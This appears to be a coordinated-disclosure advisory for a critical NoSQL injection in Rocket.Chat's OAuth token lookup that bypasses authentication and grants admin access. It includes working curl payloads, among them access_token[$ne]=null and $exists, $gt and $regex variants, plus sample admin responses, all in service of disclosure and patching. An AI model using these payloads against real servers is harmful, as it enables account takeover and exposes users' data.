<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-GEM3N3N3 -->

# ANT-2026-GEM3N3N3 · rocketchat/rocket.chat

## sql-injection critical

[CVE-2026-29198](https://nvd.nist.gov/vuln/detail/CVE-2026-29198)

Claude critical
Security research firm -
Maintainer critical

Anthropic's analysis of this finding, sealed at approval.

# ANT-2026-GEM3N3N3: Critical vulnerability (cvss 9.8): complete authentication bypass to admin permissions

On Rocket.Chat instances with an OAuth provider configured, the REST API authenticates requests by looking up the `access_token` query parameter against stored OAuth tokens. The parameter is not validated as a string before being used in the MongoDB query, so an attacker can supply an object such as `access_token[$ne]=null` via querystring bracket notation. This causes the token lookup to match the first stored OAuth token, which is typically the admin user's. A single unauthenticated HTTP request therefore yields full admin API access, including user enumeration, server statistics, and room administration. Variants using `$exists`, `$gt`, and `$regex` all succeed identically.

**Project:** rocketchat/rocket.chat

The OAuth access-token lookup accepts the raw parsed querystring value, so `?access_token[$ne]=null` becomes the object `{ $ne: null }` and is passed as a MongoDB query operator instead of a literal string. The resulting query matches any document with a non-null token, and the server treats the first match (ordinarily the admin) as the authenticated caller. No type check or `$`-key sanitization is applied to the parameter before it reaches the database query.

1. Identify a Rocket.Chat server with OAuth login enabled.
2. Issue `curl --globoff 'https://target/api/v1/me?access_token[$ne]=null'`.
3. Server matches the first stored OAuth token and returns the admin profile.
4. Reuse the same parameter on any authenticated/admin endpoint (e.g. `/api/v1/users.list`, `/api/v1/rooms.adminRooms`) for full admin API control.
5. Optionally use `access_token[$regex]=...` to target specific users.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-GEM3N3N3.

---

**Reference:** ANT-2026-GEM3N3N3

ADVISORY

<https://github.com/RocketChat/Rocket.Chat/pull/39492/>

1. 2026-02-20
2. 2026-02-20
3. 2026-02-20
4. 2026-04-22
5. 2026-08-18

e03b3132ed05970e4d19e61d9e241452d55d6bd8252152321475fd68d0c2c389c71667e7b1d4cbc15dd833c7092e4d5e84556d5924b7c29560901dfe4c5bb3a6

Committed 2026-02-20 02:46 UTC

Revealed 2026-08-18 00:36 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-GEM3N3N3%22%2C%22bug_class%22%3A%22NoSQL%20Injection%22%2C%22claude_severity%22%3A%22critical%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-05-14T22%3A41%3A26%2B00%3A00%22%2C%22description%22%3A%22On%20Rocket.Chat%20instances%20with%20an%20OAuth%20provider%20configured%2C%20the%20REST%20API%20authenticates%20requests%20by%20looking%20up%20the%20%60access_token%60%20query%20parameter%20against%20stored%20OAuth%20tokens.%20The%20parameter%20is%20not%20validated%20as%20a%20string%20before%20being%20used%20in%20the%20MongoDB%20query%2C%20so%20an%20attacker%20can%20supply%20an%20object%20such%20as%20%60access_token%5B%24ne%5D%3Dnull%60%20via%20querystring%20bracket%20notation.%20This%20causes%20the%20token%20lookup%20to%20match%20the%20first%20stored%20OAuth%20token%2C%20which%20is%20typically%20the%20admin%20user%27s.%20A%20single%20unauthenticated%20HTTP%20request%20therefore%20yields%20full%20admin%20API%20access%2C%20including%20user%20enumeration%2C%20server%20statistics%2C%20and%20room%20administration.%20Variants%20using%20%60%24exists%60%2C%20%60%24gt%60%2C%20and%20%60%24regex%60%20all%20succeed%20identically.%22%2C%22discovered_at%22%3A%222026-02-20T02%3A46%3A30%2B00%3A00%22%2C%22location%22%3Anull%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22RocketChat/Rocket.Chat%22%2C%22reproduction%22%3A%5B%221.%20Identify%20a%20Rocket.Chat%20server%20with%20OAuth%20login%20enabled.%22%2C%222.%20Issue%20%60curl%20--globoff%20%27https%3A//target/api/v1/me%3Faccess_token%5B%24ne%5D%3Dnull%27%60.%22%2C%223.%20Server%20matches%20the%20first%20stored%20OAuth%20token%20and%20returns%20the%20admin%20profile.%22%2C%224.%20Reuse%20the%20same%20parameter%20on%20any%20authenticated/admin%20endpoint%20%28e.g.%20%60/api/v1/users.list%60%2C%20%60/api/v1/rooms.adminRooms%60%29%20for%20full%20admin%20API%20control.%22%2C%225.%20Optionally%20use%20%60access_token%5B%24regex%5D%3D...%60%20to%20target%20specific%20users.%22%5D%2C%22technical_details%22%3A%22Hi%20--%5Cn%5CnI%20am%20a%20security%20researcher%20at%20Anthropic.%20I%27ve%20been%20using%20LLMs%20to%20find%5Cn%5Cnvulnerabilities%20in%20projects%2C%20and%20one%20of%20those%20has%20been%20Rocket.Chat.%20I%5Cn%5Cnbelieve%20I%27ve%20found%20an%20extremely%20severe%20vulnerability%3A%20on%20any%5Cn%5CnRocket.Chat%20instance%20with%20a%20linked%20OAuth%20endpoint%2C%20an%20adversary%20can%5Cn%5Cncompletely%20bypass%20all%20authentication%20and%20become%20an%20Admin%20with%20a%20single%5Cn%5Cnrequest.%20While%20I%20used%20an%20LLM%20to%20find%20this%20bug%20I%27ve%20validated%20it%5Cn%5Cnpersonally%20and%20wrote%20this%20email%20myself.%5Cn%5CnSpecifically%2C%20by%20passing%20a%20NoSQL%20operator%20as%20the%20%60access_token%60%20query%5Cn%5Cnparameter%20%28e.g.%20%60%3Faccess_token%5B%24ne%5D%3Dnull%60%29%2C%20an%20attacker%20can%20gain%20full%5Cn%5Cnaccess%20as%20whichever%20user%20owns%20the%20first%20matched%20OAuth%20token%2C%20typically%5Cn%5Cnan%20admin.%20%28You%20could%20also%20try%20regexes%20to%20find%20random%20user%20accounts%20if%5Cn%5Cnthe%20admin%20isn%27t%20the%20first%2C%20but%20it%20looks%20like%20it%20always%20should%20be%20the%5Cn%5Cnadmin%20by%20reading%20the%20code.%29%5Cn%5CnValidating%20the%20attack%20should%20be%20trivial%3A%5Cn%5Cn%60%60%60%5Cn%5Cn%23%20No%20auth%20%E2%80%94%20correctly%20rejected%5Cn%5Cncurl%20http%3A//localhost%3A3000/api/v1/me%5Cn%5Cn%23%20%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%5C%22You%20must%20be%20logged%20in%20to%20do%20this.%5C%22%7D%5Cn%5Cn%23%20NoSQL%20injection%20%E2%80%94%20authentication%20bypassed%5Cn%5Cncurl%20--globoff%20%27http%3A//localhost%3A3000/api/v1/me%3Faccess_token%5B%24ne%5D%3Dnull%27%5Cn%5Cn%23%20%7B%5C%22_id%5C%22%3A%5C%22...%5C%22%2C%5C%22username%5C%22%3A%5C%22admin%5C%22%2C%5C%22roles%5C%22%3A%5B%5C%22admin%5C%22%5D%2C...%2C%5C%22success%5C%22%3Atrue%7D%5Cn%5Cn%23%20Admin-only%20endpoints%20%E2%80%94%20all%20accessible%5Cn%5Cncurl%20--globoff%20%27http%3A//localhost%3A3000/api/v1/users.list%3Faccess_token%5B%24ne%5D%3Dnull%27%5Cn%5Cn%23%20%7B%5C%22users%5C%22%3A%5B%7B%5C%22username%5C%22%3A%5C%22admin%5C%22%2C%5C%22roles%5C%22%3A%5B%5C%22admin%5C%22%5D%7D%2C...%5D%2C%5C%22success%5C%22%3Atrue%7D%5Cn%5Cncurl%20--globoff%20%27http%3A//localhost%3A3000/api/v1/statistics%3Faccess_token%5B%24ne%5D%3Dnull%27%5Cn%5Cn%23%20%7B%5C%22version%5C%22%3A%5C%228.1.0%5C%22%2C%5C%22os%5C%22%3A%7B%5C%22platform%5C%22%3A%5C%22linux%5C%22%7D%2C...%7D%5Cn%5Cncurl%20--globoff%20%27http%3A//localhost%3A3000/api/v1/rooms.adminRooms%3Faccess_token%5B%24ne%5D%3Dnull%27%5Cn%5Cn%23%20%7B%5C%22rooms%5C%22%3A%5B%7B%5C%22_id%5C%22%3A%5C%22GENERAL%5C%22%2C%5C%22name%5C%22%3A%5C%22general%5C%22%2C...%7D%5D%2C...%7D%5Cn%5Cn%23%20Variant%20operators%20%E2%80%94%20all%20bypass%20authentication%5Cn%5Cncurl%20--globoff%20%27http%3A//localhost%3A3000/api/v1/me%3Faccess_token%5B%24exists%5D%3Dtrue%27%5Cn%5Cncurl%20--globoff%20%27http%3A//localhost%3A3000/api/v1/me%3Faccess_token%5B%24gt%5D%3D%27%5Cn%5Cncurl%20--globoff%20%27http%3A//localhost%3A3000/api/v1/me%3Faccess_token%5B%24regex%5D%3D.%2A%27%5Cn%5Cn%23%20All%20return%20200%20OK%20with%20admin%20profile%5Cn%5Cn%60%60%60%5Cn%5CnPlease%20let%20me%20know%20if%20you%20have%20any%20other%20questions%5Cn%5CnThanks%2C%5Cn%5CnNicholas%22%2C%22title%22%3A%22Critical%20vulnerability%20%28cvss%209.8%29%3A%20complete%20authentication%20bypass%20to%20admin%20permissions%22%2C%22vendor_severity%22%3Anull%7D)

```
  "ant_id": "ANT-2026-GEM3N3N3",
  "bug_class": "NoSQL Injection",
  "claude_severity": "critical",
  "created_at": "2026-05-14T22:41:26+00:00",
  "description": "On Rocket.Chat instances with an OAuth provider configured, the REST API authenticates requests by looking up the `access_token` query parameter against stored OAuth tokens. The parameter is not validated as a string before being used in the MongoDB query, so an attacker can supply an object such as `access_token[$ne]=null` via querystring bracket notation. This causes the token lookup to match the first stored OAuth token, which is typically the admin user's. A single unauthenticated HTTP request therefore yields full admin API access, including user enumeration, server statistics, and room administration. Variants using `$exists`, `$gt`, and `$regex` all succeed identically.",
  "discovered_at": "2026-02-20T02:46:30+00:00",
  "location": null,
  "project": "RocketChat/Rocket.Chat",
    "1. Identify a Rocket.Chat server with OAuth login enabled.",
    "2. Issue `curl --globoff 'https://target/api/v1/me?access_token[$ne]=null'`.",
    "3. Server matches the first stored OAuth token and returns the admin profile.",
    "4. Reuse the same parameter on any authenticated/admin endpoint (e.g. `/api/v1/users.list`, `/api/v1/rooms.adminRooms`) for full admin API control.",
    "5. Optionally use `access_token[$regex]=...` to target specific users."
  "technical_details": "Hi --\n\nI am a security researcher at Anthropic. I've been using LLMs to find\n\nvulnerabilities in projects, and one of those has been Rocket.Chat. I\n\nbelieve I've found an extremely severe vulnerability: on any\n\nRocket.Chat instance with a linked OAuth endpoint, an adversary can\n\ncompletely bypass all authentication and become an Admin with a single\n\nrequest. While I used an LLM to find this bug I've validated it\n\npersonally and wrote this email myself.\n\nSpecifically, by passing a NoSQL operator as the `access_token` query\n\nparameter (e.g. `?access_token[$ne]=null`), an attacker can gain full\n\naccess as whichever user owns the first matched OAuth token, typically\n\nan admin. (You could also try regexes to find random user accounts if\n\nthe admin isn't the first, but it looks like it always should be the\n\nadmin by reading the code.)\n\nValidating the attack should be trivial:\n\n```\n\n# No auth — correctly rejected\n\ncurl http://localhost:3000/api/v1/me\n\n# {\"success\":false,\"error\":\"You must be logged in to do this.\"}\n\n# NoSQL injection — authentication bypassed\n\ncurl --globoff 'http://localhost:3000/api/v1/me?access_token[$ne]=null'\n\n# {\"_id\":\"...\",\"username\":\"admin\",\"roles\":[\"admin\"],...,\"success\":true}\n\n# Admin-only endpoints — all accessible\n\ncurl --globoff 'http://localhost:3000/api/v1/users.list?access_token[$ne]=null'\n\n# {\"users\":[{\"username\":\"admin\",\"roles\":[\"admin\"]},...],\"success\":true}\n\ncurl --globoff 'http://localhost:3000/api/v1/statistics?access_token[$ne]=null'\n\n# {\"version\":\"8.1.0\",\"os\":{\"platform\":\"linux\"},...}\n\ncurl --globoff 'http://localhost:3000/api/v1/rooms.adminRooms?access_token[$ne]=null'\n\n# {\"rooms\":[{\"_id\":\"GENERAL\",\"name\":\"general\",...}],...}\n\n# Variant operators — all bypass authentication\n\ncurl --globoff 'http://localhost:3000/api/v1/me?access_token[$exists]=true'\n\ncurl --globoff 'http://localhost:3000/api/v1/me?access_token[$gt]='\n\ncurl --globoff 'http://localhost:3000/api/v1/me?access_token[$regex]=.*'\n\n# All return 200 OK with admin profile\n\n```\n\nPlease let me know if you have any other questions\n\nThanks,\n\nNicholas",
  "title": "Critical vulnerability (cvss 9.8): complete authentication bypass to admin permissions",
  "vendor_severity": null
```
